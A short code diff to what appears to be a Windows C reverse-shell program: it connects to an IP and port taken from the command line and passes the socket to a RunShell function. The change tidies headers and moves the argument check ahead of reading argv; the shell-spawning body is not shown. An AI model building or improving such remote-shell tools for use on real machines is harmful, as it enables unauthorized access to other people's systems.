@@ -1,14 +1,10 @@
-#include <minwindef.h>
-#include <processthreadsapi.h>
-#include <psdk_inc/_socket_types.h>
+#define WIN32_LEAN_AND_MEAN
 #include <stdio.h>
 #include <string.h>
-#include <synchapi.h>
 #include <windows.h>
-#include <winnt.h>
-#include <winsock.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+
 #ifdef _MSC_VER
 #pragma comment(lib, "ws2_32.lib")
 #endif
@@ -70,12 +66,13 @@ void RunShell(SOCKET shell) {
 }
 
 int main(int argc, char *argv[]) {
-  char *ip_addr = argv[1];
-  int port = atoi(argv[2]);
 
   if (argc != 3) {
     printf("Usage: %s <ip> <port>\n", argv[0]);
+    return -1;
   }
+  char *ip_addr = argv[1];
+  int port = atoi(argv[2]);
   SOCKET shell = ConnectToServer(ip_addr, port);
   if (shell == INVALID_SOCKET) {
     return 1;
